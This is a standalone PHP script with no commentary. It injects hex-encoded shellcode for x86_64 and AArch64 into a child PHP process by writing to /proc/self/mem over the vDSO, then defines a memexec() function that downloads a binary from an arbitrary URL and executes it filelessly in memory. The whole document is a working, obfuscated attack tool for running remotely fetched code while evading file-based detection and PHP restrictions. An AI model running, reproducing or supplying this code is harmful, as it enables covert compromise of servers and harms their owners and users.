$executor='
preg_match("/^.*vdso.*\$/m", file_get_contents("/proc/self/maps"), $matches);
$vdso_addr = substr($matches[0], 0, strpos($matches[0], "-"));
$vdso_dec = hexdec($vdso_addr);
$vdso_addr = bin2hex(strrev(hex2bin($vdso_addr))); // To little endian
$syscall = file_get_contents("/proc/self/syscall");
$syscall_array = explode(" ", $syscall);
$addr_dec = hexdec(trim($syscall_array[8]));
if(php_uname("m") == "x86_64")
{ // x64
    $jmp = hex2bin("48b8". $vdso_addr . "0000ffe0");
    $stager = hex2bin("41b90000000041b8ffffffff41ba22000000ba03000000be00100000bf00000000b8090000000f0589f24889c631c089c70f0531c00f054889f789d6ba0500000066b80a000f05ffe7");
} else { // Aarch64
    $jmp = hex2bin("4000005800001fd6". $vdso_addr . "0000");
    $stager = hex2bin("050080520400801243048052620080520100825200008052c81b8052010000d4e203012ae10300aae807805200008052010000d400008052010000d4e00301aae30301aae103022aa2008052481c8052010000d460001fd6");
}
$fd = fopen("/proc/self/mem", "r+");
fseek($fd, $vdso_dec);
fwrite($fd, $stager);
fseek($fd, $addr_dec);
fwrite($fd, $jmp);
fclose($fd);
file_get_contents("/proc/self/maps");
';

$cmd_array = ['php', '-a'];
$descriptorspec = array(
    0 => array("pipe", "r"),
    1 => fopen('php://stdout', 'w'),
    2 => fopen('php://stderr', 'w'),
    3 => fopen('php://stdin' , 'w')
);

$process = proc_open($cmd_array, $descriptorspec, $pipes);
fwrite($pipes[0], $executor);
sleep(1);

if(php_uname("m") == "x86_64")
{
    $shellcode = hex2bin("554889e54881ec2002000048c745d800004040488d05500c000048898578ffffffc78574ffffff00000000488bbd78ffffff8b8574ffffff48984889c6b8020000000f058945d48b45d4488d15280c00004889d689c7e8e10900004889c2488db5f0fdffff8b45d44889d1ba7f00000089c7e8e80b0000c68405f0fdffff008b45d48945848b458448984889c7b8030000000f05488b55d8488d85f0fdffff4889d64889c7e8ea070000e9e60400008b85e8fdffff85c00f84500100008b85e8fdffff489848898568ffffff48838568ffffff0f4883a568fffffff04889e2488b8568ffffff48f7d84801d04889c44889e0488945c88b85e8fdffff4863d0488b45c8be000000004889c7e82e0b00008b85e8fdffff4863d0488b45c84889c6bf00000000e82d0b0000c745e401000000488b45c8488945e8eb048345e401488b45e84889c7e8da0a00004883c001480145e88b85e8fdffff4863d0488b45c84801d0483945e872d28b45e483c001489848c1e00348898560ffffff48838560ffffff0f4883a560fffffff04889e2488b8560ffffff48f7d84801d04889c44889e0488945f0c745e000000000488b45c8488945e8eb338b45e04898488d14c500000000488b45f04801c2488b45e8488902488b45e84889c7e8470a00004883c001480145e88345e0018b45e03b45e47cc58b45e44898488d14c500000000488b45f04801d048c70000000000488d85ecfdffffba040000004889c6bf00000000e8310a000048c78558ffffff1100000048c78550ffffff0000000048c78548ffffff0000000048c78540ffffff0000000048c78538ffffff00000000488bbd58ffffff488bb550ffffff488b9548ffffff4c8b9540ffffff4c8b8538ffffffb8380000000f0585c00f857c0200008b85ecfdffff48984889c7e8fe080000488945c0488b45c0be000040004889c7e820030000488945b8488b45d8488b5018488b45d84801d0488945b0488b45c0488b5018488b45b84801d0488945a8488b45c00fb740380fb7c0488945a0488b45c00fb740360fb7c048894598488b45c0488b5020488b45b84801d0488945908b85ecfdffff4898488b55c048899530ffffff48898528ffffff488bbd30ffffff488bb528ffffffb80b0000000f0541b90000000041b8ffffffffb922000200ba03000000be00100200bf00000000e8e908000048894588488b4588480500100200488945f848836df808488b45f848c700000000008b45e483e00185c0741048836df808488b45f848c7000000000048c78570feffff0600000048c78578feffff0010000048c78580feffff19000000488b45b048898588feffff48c78590feffff09000000488b45a848898598feffff48c785a0feffff07000000488b45d8488985a8feffff48c785b0feffff05000000488b45a0488985b8feffff48c785c0feffff04000000488b4598488985c8feffff48c785d0feffff03000000488b4590488985d8feffff48c785e0feffff0000000048c785e8feffff00000000488345f880488d8d70feffff488b45f8ba800000004889ce4889c7e8d707000048836df808488b45f848c7000000000048836df808488b45f848c700000000008b45e4489848c1e00348f7d8480145f88b45e4c1e0034863d0488b4df0488b45f84889ce4889c7e88b07000048836df8088b45e44863d0488b45f8488910c78524ffffff03000000c78520ffffff000000008b8524ffffff48984889c78b8520ffffff48984889c6b8210000000f05488b45f8488b55b04889c4ffe2c78514ffffffffffffff48c78508ffffff00000000c78504ffffff0000000048c785f8feffff000000008b8514ffffff48984889c7488bb508ffffff8b8504ffffff48984889c24c8b95f8feffffb83d0000000f05b86e0000000f0589851cffffffc78518ffffff120000008b851cffffff48984889c78b8518ffffff48984889c6b83e0000000f0590488d85e8fdffffba040000004889c6bf00000000e8a90600004883f8040f84f7faffffc785f4feffff000000008b85f4feffff48984889c7b83c0000000f05554889e54881eca00000004889bd68ffffff4889b560ffffff48c745f80000000048c745f000000000488b8568ffffff488945d8488b45d8488b5020488b8568ffffff4801d0488945d0488b45d80fb74038668945ce488b8568ffffff488d15490600004889d64889c7e830030000488945c0488b45d80fb740106683f803750b488b8560ffffff488945f0c745ec00000000e90e0200008b45ec4863d04889d048c1e0034829d048c1e0034889c2488b45d04801d08b0083f8010f85e00100008b45ec4863d04889d048c1e0034829d048c1e0034889c2488b45d04801d08b40048945bc8b45ec4863d04889d048c1e0034829d048c1e0034889c2488b45d04801d0488b4008488945b08b45ec4863d04889d048c1e0034829d048c1e0034889c2488b45d04801d0488b4010488945a88b45ec4863d04889d048c1e0034829d048c1e0034889c2488b45d04801d0488b4020488945e08b45ec4863d04889d048c1e0034829d048c1e0034889c2488b45d04801d0488b4028488945a0488b45a8482500f0ffff488945988b45bcc1e80283e00189c28b45bc83e00209c28b45bcc1e00283e00409d0894594488b45a8482b4598480145e0488b45a8482b4598480145a0488b4598482b45a8480145b0488b55f0488b4598488d3c02488b45a041b90000000041b8ffffffffb932000000ba030000004889c6e87a04000048837db0007508488b4598488945f848837dc0007427488b45c0483b4598721d488b5598488b45e04801d0483945c0730c488b45c0482b4598488945e0488b9568ffffff488b45b0488d3402488b55f0488b4598488d0c02488b45e04889c24889cfe80d0400008b4594488b4df0488b55984801ca48895588488b55e04889558089857cffffff488b7d88488b75808b857cffffff48984889c2b80a0000000f05eb01908345ec010fb745ce3945ec0f8ce5fdffff488b55f0488b45f84801d0c9c3554889e54883ec7048897d9848897590488b4598488945b0c745ac00000000488b7db08b45ac48984889c6b8020000000f058945fc8b45fc8945cc48c745c000000000c745bc020000008b45cc48984889c7488b45c04889c68b45bc48984889c2b8080000000f05488945f08b55fc488b45f041b9000000004189d0b902000000ba010000004889c6bf00000000e825030000488945e8488b45e8be000040404889c7e898fcffff488b45e8488945d8488b45f0488945d0488b7dd8488b75d0b80b0000000f058b45fc8945e48b45e448984889c7b8030000000f0590c9c3554889e54883ec4048897dc8488975c0488b45c8488945f0488b45f0488b5028488b45c84801d0488945e8488b45f00fb7403c668945e6488b45f00fb7403e668945e40fb745e448c1e0064889c2488b45e84801d0488b5018488b45c84801d0488945d8c745fc00000000eb4c8b45fc489848c1e0064889c2488b45e84801d08b0089c2488b45d84801c2488b45c04889c64889d7e82702000075198b45fc489848c1e0064889c2488b45e84801d0488b4010eb128345fc010fb745e63945fc7cabb800000000c9c3554889e54883c480897d8c48897580488d75908b458cb900000000ba4000000089c7e8fc0100000fb745cc668945fa0fb745fa48c1e006488945d0488345d00f488365d0f04889e2488b45d048f7d84801d04889c44889e0488945f00fb745ce668945ee488b45b84889c10fb745fa48c1e0064889c2488b75f08b458c89c7e89f0100000fb745ee48c1e0064889c2488b45f04801d0488b4020488945d8488345d80f488365d8f04889e2488b45d848f7d84801d04889c44889e0488945e00fb745ee48c1e0064889c2488b45f04801d0488b40184889c10fb745ee48c1e0064889c2488b45f04801d0488b5020488b75e08b458c89c7e827010000c745fc00000000eb4c8b45fc489848c1e0064889c2488b45f04801d08b0089c2488b45e04801c2488b45804889c64889d7e8c600000075198b45fc489848c1e0064889c2488b45f04801d0488b4018eb128345fc010fb745fa3945fc7cabb800000000c9c3554889e54883ec3048897dd848c745f00000000048c745f800000000488b45d841b90000000041b8ffffffffb922000000ba030000004889c6bf00000000e86c000000488945e8488b55e8488b45f8488d0c02488b45d84889c24889cebf00000000e853000000488945f0488b45f0480145f8488b45f0482945d848837dd80075c5488b45e8c9c331c031c9ffc9f2aef7d1678d41ffc357e8ebffffff5ff3a6c331c04889d1f3aac34889d1f3a4c3b8090000004989ca0f05c3b8000000000f05c3b8110000004989ca0f05c32f70726f632f73656c662f657865002e696e74657270002e62737300");
} else {
    $shellcode = hex2bin("ffc308d1fd7b00a9fd0300910008a8d2a00701f960700030a0d700f9bfa701b9a1d740f9a0a781b9e20300aa080780d2600c8092010000d4a00702b9e16e0030a00742b96a020094e10300aaa0830091e30301aae20f80d2e10300aaa00742b963030094e10300aaa08300911f682138a00742b9a0b701b9280780d2a0b781b9010000d4a0830091a10741f9eb01009421010014a01b40b91f000071000c0054a01b40b9007c4093a0cf00f9a0cf40f9003c0091a0cf00f9a0cf40f900ec7c92a0cf00f9e1030091a0cf40f9e00300cb2000008b1f000091e0030091a0ff00f9a01b40b9007c4093e20300aa01008052a0ff40f9fb020094a01b40b9007c4093e20300aaa1ff40f9000080522f03009420008052a01702b9a0ff40f9a00f01f904000014a01742b900040011a01702b9a00f41f9b702009400040091a10f41f92000008ba00f01f9a01b40b9007c4093a1ff40f92000008ba10f41f93f0000eb23feff54a01742b900040011007c409300f07dd3a0cb00f9a0cb40f9003c0091a0cb00f9a0cb40f900ec7c92a0cb00f9e1030091a0cb40f9e00300cb2000008b1f000091e0030091a01301f9bf1302b9a0ff40f9a00f01f910000014a01382b900f07dd3a11341f92000008ba10f41f9010000f9a00f41f98e02009400040091a10f41f92000008ba00f01f9a01342b900040011a01302b9a11342b9a01742b93f00006bcbfdff54a01782b900f07dd3a11341f92000008b1f0000f9a0730091820080d2e10300aa00008052e7020094200280d2a0c700f9bfc300f9bfbf00f9bfbb00f9bfb700f9a1c340f9a2bf40f9a3bb40f9a4b740f9881b80d2a0c740f9010000d41f00007181120054a01f40b9007c409344020094a0fb00f90108a0d2a0fb40f9af000094a0f700f9a00741f9000c40f9a10741f92000008ba0f300f9a0fb40f9000c40f9a1f740f92000008ba0ef00f9a0fb40f900704079003c4092a0eb00f9a0fb40f9006c4079003c4092a0e700f9a0fb40f9001040f9a1f740f92000008ba0e300f9a01f40b9007c4093a1fb40f9a1b300f9a0af00f9a1af40f9e81a80d2a0b340f9010000d4050080d204008012430480524300a07262008052010082d24100a0f2000080d29b020094a0df00f9a0df40f900844091a01701f9a01741f9002000d1a01701f9a01741f91f0000f9a01742b9000000121f000071c0000054a01741f9002000d1a01701f9a01741f91f0000f9c00080d2a05300f9000082d2a05700f9200380d2a05b00f9a0f340f9a05f00f9200180d2a06300f9a0ef40f9a06700f9e00080d2a06b00f9a00741f9a06f00f9a00080d2a07300f9a0eb40f9a07700f9800080d2a07b00f9a0e740f9a07f00f9600080d2a08300f9a0e340f9a08700f9bf8b00f9bf8f00f9a01741f9000002d1a01701f9a0830291021080d2e10300aaa01741f94b020094a01741f9002000d1a01701f9a01741f91f0000f9a01741f9002000d1a01701f9a01741f91f0000f9a01782b900f07dd3e00300cba11741f92000008ba01701f9a01742b900701d53007c4093e20300aaa11341f9a01741f934020094a01741f9002000d1a01701f9a11782b9a01741f9010000f960008052a05701b9bf5301b9a05381b9e10300aa020080d2080380d2a05781b9010000d4a11741f9a2f340f93f00009140001fd600008012a04701b9bf9f00f9bf3701b9bf9700f9a19f40f9a03781b9e20300aaa39740f9882080d2a04781b9010000d4a81580d2010000d4a04f01b940028052a04b01b9a04b81b9e10300aa281080d2a04f81b9010000d41f2003d5a0630091820080d2e10300aa00008052290200941f1000f140dbff54bf2701b9a80b80d2a02781b9010000d4fd7bb5a9fd030091e00f00f9e10b00f9ff5700f9ff5300f9e00f40f9e04700f9e04740f9001040f9e10f40f92000008be04300f9e04740f900704079e0ff0079a1440010e00f40f9e2000094e03b00f9e04740f9002040791f0c007161000054e00b40f9e05300f9ff9f00b99a000014e19f80b9e00301aa00f07dd3000001cb00f07dd3e10300aae04340f90000018b000040b91f04007161110054e19f80b9e00301aa00f07dd3000001cb00f07dd3e10300aae04340f90000018b000440b9e06f00b9e19f80b9e00301aa00f07dd3000001cb00f07dd3e10300aae04340f90000018b000440f9e03300f9e19f80b9e00301aa00f07dd3000001cb00f07dd3e10300aae04340f90000018b000840f9e02f00f9e19f80b9e00301aa00f07dd3000001cb00f07dd3e10300aae04340f90000018b001040f9e04b00f9e19f80b9e00301aa00f07dd3000001cb00f07dd3e10300aae04340f90000018b001440f9e02b00f9e02f40f900cc7492e02700f9e06f40b9007c025301000012e06f40b900001f122100002ae06f40b900741e5300001e122000002ae04700b9e12f40f9e02740f9200000cbe14b40f92000008be04b00f9e12f40f9e02740f9200000cbe12b40f92000008be02b00f9e12740f9e02f40f9200000cbe13340f92000008be03300f9e15340f9e02740f92000008b050080d2040080124306805262008052e12b40f995010094e03340f91f0000f161000054e02740f9e05700f9e03b40f91f0000f1e0010054e13b40f9e02740f93f0000eb63010054e12740f9e04b40f92000008be13b40f93f0000eba2000054e13b40f9e02740f9200000cbe04b00f9e15340f9e02740f92300008be10f40f9e03340f92000008be24b40f9e10300aae00303aa5d010094e15340f9e02740f92100008be04740b9e11f00f9e14b40f9e11b00f9e02f00b9e11b40f9e02f80b9e20300aa481c80d2e01f40f9010000d4020000141f2003d5e09f40b900040011e09f00b9e0ff4079e19f40b93f00006b8becff54e15340f9e05740f92000008bfd7bcba8c0035fd6fd7bb8a9fd030091e00f00f9e10b00f9e00f40f9e01b00f9ff2f00b9e11b40f9e02f80b9e20300aa080780d2600c8092010000d4e07f00b9e07f40b9e04f00b9ff2300f940008052e03f00b9e02340f9e10300aae03f80b9e20300aac80780d2e04f80b9010000d4e03b00f9050080d2e47f40b94300805222008052e13b40f9000080d237010094e03700f9e10b40f9e03740f91dffff97e03740f9e02f00f9e03b40f9e02b00f9e12b40f9e81a80d2e02f40f9010000d4e07f40b9e06700b9280780d2e06780b9010000d41f2003d5fd7bc8a8c0035fd6fd7bbba9fd030091e00f00f9e10b00f9e00f40f9e02300f9e02340f9001440f9e10f40f92000008be01f00f9e02340f900784079e06f0079e02340f9007c4079e06b0079e06b407900e47ad3e11f40f92000008b000c40f9e10f40f92000008be01700f9ff4f00b916000014e04f80b900e47ad3e11f40f92000008b000040b9e003002ae11740f92000008be10b40f9ac0000941f000071e1000054e04f80b900e47ad3e11f40f92000008b000840f909000014e04f40b900040011e04f00b9e06f4079e14f40b93f00006b0bfdff54000080d2fd7bc5a8c0035fd6fd7bb7a9fd030091a01f00b9a10b00f9a0830091030080d2020880d2e10300aaa01f40b9f7000094a0bb4079a0170179a017417900e47ad3a03300f9a03340f9003c0091a03300f9a03340f900ec7c92a03300f9e1030091a03340f9e00300cb2000008b1f000091e0030091a04300f9a0bf4079a0ff0079a017417900e47ad3a12740f9e30301aae20300aaa14340f9a01f40b9db000094a0ff407900e47ad3a14340f92000008b001040f9a03700f9a03740f9003c0091a03700f9a03740f900ec7c92a03700f9e1030091a03740f9e00300cb2000008b1f000091e0030091a03b00f9a0ff407900e47ad3a14340f92000008b021040f9a0ff407900e47ad3a14340f92000008b000c40f9e30300aaa13b40f9a01f40b9ba000094bf8f00b916000014a08f80b900e47ad3a14340f92000008b000040b9e003002aa13b40f92000008ba10b40f9470000941f000071e1000054a08f80b900e47ad3a14340f92000008b000c40f909000014a08f40b900040011a08f00b9a0174179a18f40b93f00006b0bfdff54000080d2bf030091fd7bc9a8c0035fd6fd7bbca9fd030091e00f00f9ff1b00f9ff1f00f9050080d2040080124304805262008052e10f40f9000080d27a000094e01700f9e11740f9e01f40f92000008be20f40f9e10300aa000080527e000094e01b00f9e11f40f9e01b40f92000008be01f00f9e10f40f9e01b40f9200000cbe00f00f9e00f40f91f0000f1c1fdff54e01740f9fd7bc4a8c0035fd6ff8300d1e00700f9ff0f00f904000014e00f40f900040091e00f00f9e10740f9e00f40f92000008b000040391f00007101ffff54e00f40f9ff830091c0035fd6ff8300d1e00700f9e10300f9ff0f00f904000014e00f40f900040091e00f00f9e10740f9e00f40f92000008b00004039e203002ae10340f9e00f40f92000008b000040394000004be01700b91f000071a1010054e10740f9e00f40f92000008b000040391f000071e0000054e10340f9e00f40f92000008b000040391f000071a1fcff54e01740b9ff830091c0035fd6ffc300d1e00f00f9e11700b9e20700f9ff1700f90a000014e01740f9e10f40f92000008be11740b9211c001201000039e01740f900040091e01700f9e01740f9e10740f93f0000eb88feff54e00f40f9ffc30091c0035fd6ffc300d1e00f00f9e10b00f9e20700f9ff1700f90c000014e01740f9e10b40f92100008be01740f9e20f40f94000008b2100403901000039e01740f900040091e01700f9e01740f9e10740f93f0000eb48feff54e00f40f9ffc30091c0035fd6ffc300d1e01700f9e11300f9e21f00b9e31b00b9e41700b9e50700f9c81b80d2010000d41f2003d5ffc30091c0035fd6ff8300d1e01f00b9e10b00f9e20700f9e80780d2010000d41f2003d5ff830091c0035fd6ff8300d1e01f00b9e10b00f9e20700f9e30300f9680880d2010000d41f2003d5ff830091c0035fd62e627373002e696e74657270002f70726f632f73656c662f65786500");
}

fwrite($pipes[0], $shellcode);

$GLOBALS['pipe'] = $pipes[0];
function memexec($url, $argv = [], $stop = true)
{
    $args = "";
    foreach($argv as &$arg)
        $args .= $arg . "\0";
    unset($arg);

    $f = fopen($url, "r");
    $binary = "";
    while(!feof($f))
        $binary .= fread($f, 2048);
    fclose($f);

    $args = pack('V', strlen($args)) . $args . pack('V', strlen($binary));
    fwrite($GLOBALS['pipe'], $args);
    fwrite($GLOBALS['pipe'], $binary);
    if($stop) posix_kill(posix_getpid(), 19);
}
